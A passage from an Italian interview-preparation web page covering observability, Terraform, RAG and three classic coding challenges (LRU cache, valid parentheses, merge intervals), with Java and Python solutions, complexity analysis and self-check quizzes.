                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q30" id="q30a" value="a">
                            <label for="q30a">Nessun rischio: Terraform serializza automaticamente le operazioni</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q30" id="q30b" value="b">
                            <label for="q30b">Entrambe le modifiche falliranno con un errore di conflitto</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q30" id="q30c" value="c">
                            <label for="q30c">Lo state può corrompersi: il secondo apply potrebbe sovrascrivere lo state del primo</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q30" id="q30d" value="d">
                            <label for="q30d">Le risorse verranno create duplicate con nomi diversi</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q30')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q30"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 6 -->
            <section class="section" id="modulo6-questions">
                <h2>Domande da Colloquio - Modulo 6</h2>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra monitoring e observability. Perché l'observability è importante nei sistemi distribuiti?</h4>
                    <p><strong>Risposta attesa:</strong> Il monitoring è reattivo: definisci metriche e alert in anticipo per problemi che ti aspetti. Funziona bene per problemi noti ("CPU alta → alert"). L'observability è esplorativa: ti permette di investigare problemi che non avevi previsto, correlando dati (logs, metrics, traces) per capire "perché il sistema si comporta così". Nei sistemi distribuiti, il numero di possibili failure mode cresce esponenzialmente con i servizi. Non puoi prevedere ogni combinazione di fallimenti, quindi hai bisogno di dati ricchi (traces, structured logs) per fare debugging post-hoc.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come funziona il context propagation in distributed tracing? Cosa succede se un servizio non lo implementa?</h4>
                    <p><strong>Risposta attesa:</strong> Il context propagation passa trace ID e span ID tra servizi, tipicamente via HTTP headers standardizzati (W3C Trace Context: <code>traceparent</code>, <code>tracestate</code>) o headers specifici del vendor (Jaeger: <code>uber-trace-id</code>). Il servizio chiamante inietta il contesto negli headers, il chiamato lo estrae e lo usa per creare span figli. Se un servizio non implementa la propagation, il trace si "rompe": gli span dopo quel servizio sembreranno trace separati, perdendo la correlazione. Il trace risulterà incompleto e il troubleshooting sarà difficile.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Terraform plan mostra che una risorsa "must be replaced". Come eviti downtime?</h4>
                    <p><strong>Risposta attesa:</strong> "Must be replaced" significa che la modifica richiede distruzione e ricreazione (es. cambio di AMI, instance type su alcuni cloud, cambio di subnet). Per evitare downtime: 1) Usa <code>lifecycle { create_before_destroy = true }</code> per creare la nuova risorsa prima di distruggere la vecchia. 2) Per risorse critiche, implementa blue-green: crea una nuova risorsa con nome diverso, sposta il traffico, poi rimuovi la vecchia dal codice. 3) Per ASG/managed services, il replacement può essere gestito dal cloud provider (es. ASG instance refresh). Importante: fai sempre <code>terraform plan</code> prima di apply e review attento dei "replace".</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestisci i secrets in Terraform? Cosa NON dovresti mai fare?</h4>
                    <p><strong>Risposta attesa:</strong> MAI: 1) Hardcodare secrets nei .tf files, 2) Committare tfvars con secrets in Git, 3) Usare local state (contiene secrets in plain text). Best practices: 1) Usa secret managers (AWS Secrets Manager, HashiCorp Vault) e referenziali via data sources. 2) Passa secrets come variabili d'ambiente (<code>TF_VAR_db_password</code>). 3) Usa remote state con encryption at rest (S3 con SSE). 4) Per CI/CD, usa secret injection della piattaforma (GitHub Secrets, GitLab CI variables). 5) Considera strumenti come SOPS per encrypted tfvars se necessario.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega come funziona RAG e perché lo useresti invece di fine-tuning.</h4>
                    <p><strong>Risposta attesa:</strong> RAG (Retrieval Augmented Generation) combina ricerca semantica con generazione LLM. Workflow: 1) Indexing: documenti → chunking → embedding → vector store. 2) Query: query utente → embedding → similarity search → top-K chunks → prompt augmentation → LLM → risposta. Preferisco RAG a fine-tuning perché: 1) Più economico e veloce (no training). 2) Dati aggiornabili senza re-training (basta re-indicizzare). 3) Citazione delle fonti (l'LLM "mostra il suo lavoro"). 4) Riduce hallucination (il modello risponde basandosi su contesto concreto). Fine-tuning è meglio per cambiare lo "stile" o insegnare task nuovi, non per knowledge injection.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quali sono i trade-off nella scelta della chunk size per RAG?</h4>
                    <p><strong>Risposta attesa:</strong> Chunk piccoli (~256 token): Pro: più precisi nel retrieval (meno noise), più chunks nel context budget. Contro: possono perdere contesto necessario (frase senza premessa), più chunks da processare. Chunk grandi (~1024 token): Pro: più contesto per chunk, meno rischio di tagliare informazioni correlate. Contro: più noise (informazioni irrilevanti nel chunk), meno chunks nel context budget, similarity score "diluito". Best practice: inizia con ~512 token + overlap di ~50 token. Poi A/B testa basandoti su retrieval accuracy. Per documenti strutturati (codice, legal), usa semantic chunking rispettando i confini naturali.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come implementeresti l'access control in un sistema RAG con documenti di diversi livelli di confidenzialità?</h4>
                    <p><strong>Risposta attesa:</strong> Due approcci principali: 1) Filtering post-retrieval: retrieval aperto, poi filtra i risultati in base ai permessi dell'utente. Semplice ma inefficiente (recuperi documenti che poi scarti). 2) Filtering pre-retrieval (preferito): aggiungi metadata ai chunks (es. <code>access_level</code>, <code>department</code>), poi usa metadata filtering nella query vector (es. pgvector: <code>WHERE metadata->>'access_level' &lt;= user_level</code>). Questo è supportato nativamente da Pinecone, Weaviate, etc. Attenzione: il prompt finale NON deve mai contenere documenti non autorizzati, anche se l'LLM li "ignorerebbe" - potrebbero essere estratti con prompt injection.</p>
                </div>
            </section>

            <!-- Links Modulo 6 -->
            <section class="section" id="modulo6-links">
                <h2>Link di Approfondimento - Modulo 6</h2>

                <div class="info-box">
                    <h4>Observability</h4>
                    <p><a href="https://opentelemetry.io/docs/" target="_blank">OpenTelemetry Documentation</a></p>
                    <p><a href="https://prometheus.io/docs/" target="_blank">Prometheus Documentation</a></p>
                    <p><a href="https://grafana.com/docs/" target="_blank">Grafana Documentation</a></p>
                    <p><a href="https://www.jaegertracing.io/docs/" target="_blank">Jaeger Tracing</a></p>
                    <p><a href="https://www.baeldung.com/spring-boot-actuator" target="_blank">Baeldung: Spring Boot Actuator</a></p>
                </div>

                <div class="info-box">
                    <h4>Infrastructure as Code</h4>
                    <p><a href="https://developer.hashicorp.com/terraform/docs" target="_blank">Terraform Documentation</a></p>
                    <p><a href="https://developer.hashicorp.com/terraform/tutorials" target="_blank">Terraform Tutorials</a></p>
                    <p><a href="https://docs.pulumi.com/" target="_blank">Pulumi Documentation</a> - IaC con linguaggi reali</p>
                    <p><a href="https://www.ansible.com/resources/get-started" target="_blank">Ansible Getting Started</a></p>
                </div>

                <div class="info-box">
                    <h4>AI/LLM Integration</h4>
                    <p><a href="https://platform.openai.com/docs" target="_blank">OpenAI API Documentation</a></p>
                    <p><a href="https://docs.anthropic.com/" target="_blank">Anthropic Claude API</a></p>
                    <p><a href="https://docs.langchain.com/" target="_blank">LangChain Documentation</a></p>
                    <p><a href="https://www.llamaindex.ai/" target="_blank">LlamaIndex</a> - Framework RAG</p>
                    <p><a href="https://www.pinecone.io/learn/" target="_blank">Pinecone Learning Center</a> - Vector databases</p>
                </div>
            </section>

            <!-- ==================== MODULO 7: CODING CHALLENGES ==================== -->

            <header class="module-header" id="modulo7">
                <span class="module-tag">Modulo 7</span>
                <h1>Coding Challenges</h1>
                <p>Esercizi classici da colloquio tecnico con soluzioni commentate e analisi della complessità</p>
            </header>

            <!-- LRU Cache Section -->
            <section class="section" id="modulo7-lru">
                <h2>LRU Cache</h2>

                <p>La <strong>LRU Cache</strong> (Least Recently Used Cache) è una delle strutture dati più richieste nei colloqui tecnici. Implementa una cache con capacità limitata che, quando è piena, rimuove l'elemento usato meno di recente.</p>

                <div class="info-box">
                    <h4>Requisiti del Problema</h4>
                    <p>Implementa una struttura dati che supporti le seguenti operazioni in <strong>O(1)</strong>:</p>
                    <ul>
                        <li><code>get(key)</code>: Ritorna il valore se la chiave esiste, altrimenti -1</li>
                        <li><code>put(key, value)</code>: Inserisce o aggiorna il valore. Se la cache è piena, rimuove l'elemento LRU</li>
                    </ul>
                </div>

                <h3>Approccio: HashMap + Doubly Linked List</h3>

                <p>Per ottenere O(1) sia per accesso che per rimozione, combiniamo due strutture:</p>
                <ul>
                    <li><strong>HashMap</strong>: accesso O(1) per chiave → nodo della lista</li>
                    <li><strong>Doubly Linked List</strong>: rimozione O(1) e mantenimento dell'ordine di utilizzo</li>
                </ul>

                <div class="diagram">
                    <pre>
HashMap                           Doubly Linked List
┌─────────────────┐              ┌──────────────────────────────────────────────┐
│  key → Node     │              │                                              │
├─────────────────┤              │  HEAD ←→ [A] ←→ [B] ←→ [C] ←→ TAIL          │
│  "A" → Node[A]  │──────────────│──────────┘       │       │                  │
│  "B" → Node[B]  │──────────────│──────────────────┘       │                  │
│  "C" → Node[C]  │──────────────│──────────────────────────┘                  │
└─────────────────┘              │                                              │
                                 │  MRU (Most Recently Used) ←──────→ LRU      │
                                 └──────────────────────────────────────────────┘

Operazioni O(1):
- get("B"): HashMap lookup → muovi Node[B] dopo HEAD
- put("D"): rimuovi nodo prima di TAIL (LRU), inserisci dopo HEAD
                    </pre>
                </div>

                <h3>Soluzione Java</h3>

                <pre><code class="language-java">class LRUCache {

    // Nodo della doubly linked list
    private class Node {
        int key, value;
        Node prev, next;

        Node(int key, int value) {
            this.key = key;
            this.value = value;
        }
    }

    private final int capacity;
    private final Map&lt;Integer, Node&gt; cache;  // HashMap per O(1) lookup
    private final Node head, tail;            // Sentinelle della lista

    public LRUCache(int capacity) {
        this.capacity = capacity;
        this.cache = new HashMap&lt;&gt;();

        // Inizializza sentinelle (semplificano edge cases)
        head = new Node(0, 0);
        tail = new Node(0, 0);
        head.next = tail;
        tail.prev = head;
    }

    public int get(int key) {
        if (!cache.containsKey(key)) {
            return -1;
        }

        Node node = cache.get(key);
        // Aggiorna: questo nodo è stato usato ora (MRU)
        removeNode(node);
        addToFront(node);

        return node.value;
    }

    public void put(int key, int value) {
        if (cache.containsKey(key)) {
            // Aggiorna valore esistente
            Node node = cache.get(key);
            node.value = value;
            removeNode(node);
            addToFront(node);
        } else {
            // Inserisci nuovo
            if (cache.size() == capacity) {
                // Rimuovi LRU (nodo prima di tail)
                Node lru = tail.prev;
                removeNode(lru);
                cache.remove(lru.key);  // Importante: rimuovi anche dalla HashMap!
            }

            Node newNode = new Node(key, value);
            cache.put(key, newNode);
            addToFront(newNode);
        }
    }

    // Helper: rimuove un nodo dalla lista (O(1) grazie ai puntatori)
    private void removeNode(Node node) {
        node.prev.next = node.next;
        node.next.prev = node.prev;
    }

    // Helper: aggiunge un nodo subito dopo head (MRU position)
    private void addToFront(Node node) {
        node.next = head.next;
        node.prev = head;
        head.next.prev = node;
        head.next = node;
    }
}</code></pre>

                <h3>Soluzione Python</h3>

                <pre><code class="language-python">from collections import OrderedDict

class LRUCache:
    """
    Python ha OrderedDict che mantiene l'ordine di inserimento
    e supporta move_to_end() in O(1) - perfetto per LRU!
    """

    def __init__(self, capacity: int):
        self.capacity = capacity
        self.cache = OrderedDict()

    def get(self, key: int) -> int:
        if key not in self.cache:
            return -1

        # Sposta alla fine (MRU)
        self.cache.move_to_end(key)
        return self.cache[key]

    def put(self, key: int, value: int) -> None:
        if key in self.cache:
            # Aggiorna e sposta in fondo
            self.cache[key] = value
            self.cache.move_to_end(key)
        else:
            if len(self.cache) >= self.capacity:
                # popitem(last=False) rimuove il primo elemento (LRU)
                self.cache.popitem(last=False)
            self.cache[key] = value


# Esempio d'uso
cache = LRUCache(2)
cache.put(1, 1)       # cache: {1=1}
cache.put(2, 2)       # cache: {1=1, 2=2}
print(cache.get(1))   # returns 1, cache: {2=2, 1=1}
cache.put(3, 3)       # evicts key 2, cache: {1=1, 3=3}
print(cache.get(2))   # returns -1 (not found)</code></pre>

                <h3>Analisi della Complessità</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Operazione</th>
                            <th>Time Complexity</th>
                            <th>Spiegazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>get(key)</code></td>
                            <td><strong>O(1)</strong></td>
                            <td>HashMap lookup O(1) + rimozione/inserimento lista O(1)</td>
                        </tr>
                        <tr>
                            <td><code>put(key, value)</code></td>
                            <td><strong>O(1)</strong></td>
                            <td>HashMap insert/update O(1) + operazioni lista O(1)</td>
                        </tr>
                    </tbody>
                </table>

                <p><strong>Space Complexity:</strong> O(capacity) - memorizziamo al massimo <code>capacity</code> elementi</p>

                <div class="info-box warning">
                    <h4>Errori Comuni da Evitare</h4>
                    <ul>
                        <li>Dimenticare di rimuovere la chiave dalla HashMap quando si fa eviction</li>
                        <li>Non gestire correttamente l'update di un valore esistente (deve diventare MRU)</li>
                        <li>Usare una sola struttura (es. solo LinkedHashMap) senza capire il meccanismo sottostante</li>
                    </ul>
                </div>
            </section>

            <!-- Valid Parentheses Section -->
            <section class="section" id="modulo7-parentheses">
                <h2>Valid Parentheses</h2>

                <p>Questo problema classico verifica se una stringa contenente solo parentesi <code>(){}[]</code> è valida, ovvero se ogni parentesi aperta ha una corrispondente chiusa nell'ordine corretto.</p>

                <div class="info-box">
                    <h4>Esempi</h4>
                    <ul>
                        <li><code>"()"</code> → <strong>true</strong></li>
                        <li><code>"()[]{}"</code> → <strong>true</strong></li>
                        <li><code>"(]"</code> → <strong>false</strong></li>
                        <li><code>"([)]"</code> → <strong>false</strong> (ordine sbagliato)</li>
                        <li><code>"{[]}"</code> → <strong>true</strong> (nested correttamente)</li>
                    </ul>
                </div>

                <h3>Approccio: Stack</h3>

                <p>Lo <strong>Stack</strong> è la struttura dati perfetta: le parentesi devono essere chiuse nell'ordine inverso di apertura (LIFO - Last In, First Out).</p>

                <div class="diagram">
                    <pre>
Input: "({[]})"

Passo 1: '(' → push      Stack: [(]
Passo 2: '{' → push      Stack: [(, {]
Passo 3: '[' → push      Stack: [(, {, []
Passo 4: ']' → pop '['   Stack: [(, {]     ✓ match
Passo 5: '}' → pop '{'   Stack: [(]        ✓ match
Passo 6: ')' → pop '('   Stack: []         ✓ match
Fine: Stack vuoto → VALID

Input: "([)]"

Passo 1: '(' → push      Stack: [(]
Passo 2: '[' → push      Stack: [(, []
Passo 3: ')' → pop '['   Stack: [(]        ✗ ')' ≠ ']' → INVALID
                    </pre>
                </div>

                <h3>Soluzione Java</h3>

                <pre><code class="language-java">class Solution {
    public boolean isValid(String s) {
        // Stack per tenere traccia delle parentesi aperte
        Deque&lt;Character&gt; stack = new ArrayDeque&lt;&gt;();

        // Mappa per matching: chiusa → aperta corrispondente
        Map&lt;Character, Character&gt; pairs = Map.of(
            ')', '(',
            '}', '{',
            ']', '['
        );

        for (char c : s.toCharArray()) {
            if (pairs.containsValue(c)) {
                // È una parentesi aperta: push
                stack.push(c);
            } else if (pairs.containsKey(c)) {
                // È una parentesi chiusa: verifica match
                if (stack.isEmpty() || stack.pop() != pairs.get(c)) {
                    return false;
                }
            }
            // Ignora altri caratteri (se presenti)
        }

        // Valido solo se tutte le parentesi sono state chiuse
        return stack.isEmpty();
    }
}

// Versione compatta senza Map (più veloce in pratica)
class SolutionOptimized {
    public boolean isValid(String s) {
        Deque&lt;Character&gt; stack = new ArrayDeque&lt;&gt;();

        for (char c : s.toCharArray()) {
            // Quando incontri un'aperta, pusha la chiusa corrispondente
            if (c == '(') stack.push(')');
            else if (c == '{') stack.push('}');
            else if (c == '[') stack.push(']');
            // Quando incontri una chiusa, verifica che sia quella attesa
            else if (stack.isEmpty() || stack.pop() != c) {
                return false;
            }
        }

        return stack.isEmpty();
    }
}</code></pre>

                <h3>Soluzione Python</h3>

                <pre><code class="language-python">def isValid(s: str) -> bool:
    stack = []
    pairs = {')': '(', '}': '{', ']': '['}

    for char in s:
        if char in pairs.values():  # Parentesi aperta
            stack.append(char)
        elif char in pairs:  # Parentesi chiusa
            if not stack or stack.pop() != pairs[char]:
                return False

    return len(stack) == 0


# Versione one-liner (meno leggibile, ma elegante)
def isValid_oneliner(s: str) -> bool:
    while '()' in s or '{}' in s or '[]' in s:
        s = s.replace('()', '').replace('{}', '').replace('[]', '')
    return s == ''
# Nota: questa versione è O(n²) - NON usare in produzione!</code></pre>

                <h3>Analisi della Complessità</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>Complessità</th>
                            <th>Spiegazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Time</td>
                            <td><strong>O(n)</strong></td>
                            <td>Singolo passaggio sulla stringa, ogni operazione stack è O(1)</td>
                        </tr>
                        <tr>
                            <td>Space</td>
                            <td><strong>O(n)</strong></td>
                            <td>Nel caso peggiore (tutte aperte), lo stack contiene n elementi</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box success">
                    <h4>Varianti del Problema</h4>
                    <ul>
                        <li><strong>Minimum Add to Make Valid</strong>: Quante parentesi aggiungere per rendere valida la stringa?</li>
                        <li><strong>Longest Valid Parentheses</strong>: Sottostringa più lunga di parentesi valide (più difficile, richiede DP)</li>
                        <li><strong>Remove Invalid Parentheses</strong>: Rimuovi il minimo numero per ottenere tutte le stringhe valide</li>
                    </ul>
                </div>
            </section>

            <!-- Merge Intervals Section -->
            <section class="section" id="modulo7-intervals">
                <h2>Merge Intervals</h2>

                <p>Dato un array di intervalli <code>[[start, end], ...]</code>, unisci tutti gli intervalli che si sovrappongono.</p>

                <div class="info-box">
                    <h4>Esempi</h4>
                    <ul>
                        <li><code>[[1,3],[2,6],[8,10],[15,18]]</code> → <code>[[1,6],[8,10],[15,18]]</code></li>
                        <li><code>[[1,4],[4,5]]</code> → <code>[[1,5]]</code> (i bordi si toccano)</li>
                        <li><code>[[1,4],[0,4]]</code> → <code>[[0,4]]</code></li>
                    </ul>
                </div>

                <h3>Approccio: Sort + Linear Scan</h3>

                <p>La chiave è <strong>ordinare per start time</strong>. Dopo l'ordinamento, gli intervalli sovrapponibili sono adiacenti, e possiamo fare un singolo passaggio per unirli.</p>

                <div class="diagram">
                    <pre>
Input: [[1,3], [2,6], [8,10], [15,18]]

1. Già ordinato per start

2. Visualizzazione:
   1────3
      2────────6
                   8────10
                              15────18

3. Merge Logic:
   - [1,3] → aggiungi a result: [[1,3]]
   - [2,6] → 2 ≤ 3 (overlap!) → estendi: [[1,6]]
   - [8,10] → 8 > 6 (no overlap) → aggiungi: [[1,6], [8,10]]
   - [15,18] → 15 > 10 (no overlap) → aggiungi: [[1,6], [8,10], [15,18]]

Output: [[1,6], [8,10], [15,18]]
                    </pre>
                </div>

                <h3>Soluzione Java</h3>

                <pre><code class="language-java">class Solution {
    public int[][] merge(int[][] intervals) {
        if (intervals.length &lt;= 1) {
            return intervals;
        }

        // 1. Ordina per start time
        Arrays.sort(intervals, (a, b) -> Integer.compare(a[0], b[0]));

        // 2. Lista per il risultato (dimensione variabile)
        List&lt;int[]&gt; result = new ArrayList&lt;&gt;();

        // 3. Inizia con il primo intervallo
        int[] current = intervals[0];
        result.add(current);

        // 4. Scorri e unisci
        for (int[] interval : intervals) {
            int currentEnd = current[1];
            int nextStart = interval[0];
            int nextEnd = interval[1];

            if (nextStart &lt;= currentEnd) {
                // Overlap: estendi l'intervallo corrente
                // Nota: prendiamo il max degli end perché un intervallo
                // potrebbe essere contenuto in un altro
                current[1] = Math.max(currentEnd, nextEnd);
            } else {
                // No overlap: aggiungi nuovo intervallo
                current = interval;
                result.add(current);
            }
        }

        return result.toArray(new int[result.size()][]);
    }
}

// Esempio d'uso
// Input:  [[1,3],[2,6],[8,10],[15,18]]
// Output: [[1,6],[8,10],[15,18]]</code></pre>

                <h3>Soluzione Python</h3>

                <pre><code class="language-python">def merge(intervals: list[list[int]]) -> list[list[int]]:
    if not intervals:
        return []

    # Ordina per start time
    intervals.sort(key=lambda x: x[0])

    result = [intervals[0]]

    for start, end in intervals[1:]:
        # Ultimo intervallo nel risultato
        last = result[-1]

        if start <= last[1]:
            # Overlap: estendi
            last[1] = max(last[1], end)
        else:
            # No overlap: aggiungi
            result.append([start, end])

    return result


# Test
print(merge([[1,3],[2,6],[8,10],[15,18]]))  # [[1,6],[8,10],[15,18]]
print(merge([[1,4],[4,5]]))                  # [[1,5]]
print(merge([[1,4],[0,2],[3,5]]))            # [[0,5]] dopo sorting</code></pre>

                <h3>Analisi della Complessità</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>Complessità</th>
                            <th>Spiegazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Time</td>
                            <td><strong>O(n log n)</strong></td>
                            <td>Dominato dal sorting. Il merge è O(n)</td>
                        </tr>
                        <tr>
                            <td>Space</td>
                            <td><strong>O(n)</strong></td>
                            <td>Per il risultato (nel caso peggiore, nessun merge)</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Perché O(n log n) è ottimale?</h4>
                    <p>Non possiamo fare meglio di O(n log n) perché dobbiamo ordinare gli intervalli. Se gli intervalli fossero già ordinati (o potessimo assumere che lo siano), la complessità sarebbe O(n). Questo è un buon punto da menzionare al colloquio: chiedi sempre se l'input è già ordinato!</p>
                </div>

                <div class="info-box success">
                    <h4>Varianti del Problema</h4>
                    <ul>
                        <li><strong>Insert Interval</strong>: Inserisci un nuovo intervallo in una lista già ordinata e merged</li>
                        <li><strong>Meeting Rooms</strong>: Verifica se una persona può partecipare a tutte le riunioni (no overlap)</li>
                        <li><strong>Meeting Rooms II</strong>: Quante sale servono per tutte le riunioni? (richiede min-heap)</li>
                        <li><strong>Non-overlapping Intervals</strong>: Minimo numero di intervalli da rimuovere per eliminare overlap</li>
                    </ul>
                </div>
            </section>

            <!-- Quiz Section Modulo 7 -->
            <section class="quiz-section" id="modulo7-quiz">
                <h2>Interactive Challenge Quiz - Modulo 7</h2>
                <p>Verifica la tua comprensione degli algoritmi e delle complessità con queste domande.</p>

                <!-- Question 31 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> Nella LRU Cache, perché usiamo una Doubly Linked List invece di una Singly Linked List?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q31" id="q31a" value="a">
                            <label for="q31a">Per supportare l'iterazione bidirezionale sui dati</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q31" id="q31b" value="b">
                            <label for="q31b">Per rimuovere un nodo in O(1) senza dover attraversare la lista</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q31" id="q31c" value="c">
                            <label for="q31c">Per ridurre lo spazio occupato in memoria</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q31" id="q31d" value="d">
                            <label for="q31d">Perché Java non supporta Singly Linked List nativamente</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q31')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q31"></div>
                </div>

                <!-- Question 32 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q2.</span> Quale sarebbe la complessità temporale di una LRU Cache implementata con solo una LinkedHashMap (senza custom logic)?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q32" id="q32a" value="a">
                            <label for="q32a">get: O(n), put: O(n)</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q32" id="q32b" value="b">
                            <label for="q32b">get: O(1), put: O(n) per l'eviction</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q32" id="q32c" value="c">
                            <label for="q32c">get: O(1), put: O(1) - LinkedHashMap con accessOrder=true lo gestisce</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q32" id="q32d" value="d">
                            <label for="q32d">get: O(log n), put: O(log n)</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q32')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q32"></div>
                </div>

                <!-- Question 33 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Per il problema Valid Parentheses, se la stringa contiene solo '(' e ')', qual è lo space complexity ottimale?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q33" id="q33a" value="a">
                            <label for="q33a">O(1) - basta un contatore</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q33" id="q33b" value="b">
                            <label for="q33b">O(n) - serve sempre uno stack</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q33" id="q33c" value="c">
                            <label for="q33c">O(log n) - usando una struttura ad albero</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q33" id="q33d" value="d">
                            <label for="q33d">O(n²) - bisogna confrontare ogni coppia</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q33')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q33"></div>
                </div>

                <!-- Question 34 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> Nel problema Merge Intervals, se l'input fosse già ordinato per start time, quale sarebbe la complessità totale?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q34" id="q34a" value="a">
                            <label for="q34a">Sempre O(n log n) - il sorting è comunque necessario per verificare l'ordine</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q34" id="q34b" value="b">
                            <label for="q34b">O(n²) - bisogna confrontare ogni intervallo con tutti gli altri</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q34" id="q34c" value="c">
                            <label for="q34c">O(1) - con input ordinato il problema diventa banale</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q34" id="q34d" value="d">
                            <label for="q34d">O(n) - singolo passaggio lineare per il merge</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q34')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q34"></div>
                </div>

                <!-- Question 35 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q5.</span> Stai implementando una LRU Cache per un sistema ad alta concorrenza. Quale problema principale devi risolvere?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q35" id="q35a" value="a">
                            <label for="q35a">La HashMap non è thread-safe, basta usare ConcurrentHashMap</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q35" id="q35b" value="b">
                            <label for="q35b">get() e put() devono essere atomiche: sia HashMap che lista devono essere aggiornate insieme</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q35" id="q35c" value="c">
                            <label for="q35c">La Doubly Linked List non può essere condivisa tra thread</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q35" id="q35d" value="d">
                            <label for="q35d">Non c'è problema: le strutture dati in Java sono sempre thread-safe</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q35')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q35"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 7 -->
            <section class="section" id="modulo7-questions">
                <h2>Domande da Colloquio - Modulo 7</h2>

                <div class="info-box">
                    <h4>Q: Spiega come implementeresti una LRU Cache. Quali strutture dati useresti e perché?</h4>
                    <p><strong>Risposta attesa:</strong> Userei una combinazione di HashMap e Doubly Linked List. La HashMap fornisce O(1) lookup per chiave, mappando la chiave al nodo corrispondente nella lista. La Doubly Linked List mantiene l'ordine di utilizzo: il nodo più recente (MRU) è in testa, il meno recente (LRU) è in coda. Con i puntatori prev/next, posso rimuovere un nodo in O(1) senza attraversare la lista. Quando accedo a un elemento, lo sposto in testa. Quando la cache è piena, rimuovo l'elemento in coda. Entrambe le operazioni sono O(1).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Nel problema Valid Parentheses, come gestiresti il caso con parentesi annidate come <code>"{[()]}"</code>?</h4>
                    <p><strong>Risposta attesa:</strong> Lo stack gestisce naturalmente l'annidamento. Quando incontro una parentesi aperta, la pusha. Quando incontro una chiusa, verifico che lo stack non sia vuoto e che il top sia la corrispondente aperta. Per <code>"{[()]}"</code>: push '{', push '[', push '(', pop e verifica '(' con ')', pop e verifica '[' con ']', pop e verifica '{' con '}'. Lo stack è vuoto alla fine → valido. L'ordine LIFO dello stack garantisce che le parentesi più interne siano chiuse prima di quelle esterne.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Perché nel Merge Intervals ordiniamo per start time e non per end time?</h4>
                    <p><strong>Risposta attesa:</strong> Ordinando per start time, garantiamo che quando processiamo un intervallo, tutti quelli che potrebbero sovrapporsi con esso (con start minore) sono già stati processati. L'overlap si verifica quando il prossimo start è ≤ dell'end corrente. Se ordinassimo per end time, non avremmo questa proprietà: un intervallo con end piccolo potrebbe avere start grande, rendendo impossibile determinare l'overlap con un singolo passaggio. Con start time ordering, possiamo fare merge in O(n) dopo il sorting.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come renderesti thread-safe una LRU Cache?</h4>
                    <p><strong>Risposta attesa:</strong> Il problema principale è che get() e put() modificano sia la HashMap che la lista, e queste operazioni devono essere atomiche. Opzioni: 1) Lock globale (synchronized o ReentrantLock): semplice ma crea contention. 2) Read-write lock: permette letture concorrenti, ma get() in LRU modifica la lista (sposta a MRU), quindi è comunque una write. 3) Striped locking: dividi la cache in segmenti con lock indipendenti (come ConcurrentHashMap), ma complica la gestione LRU globale. 4) In Java, considera Collections.synchronizedMap(new LinkedHashMap) o Caffeine (libreria ottimizzata per caching concorrente).</p>
                </div>

                <div class="info-box">
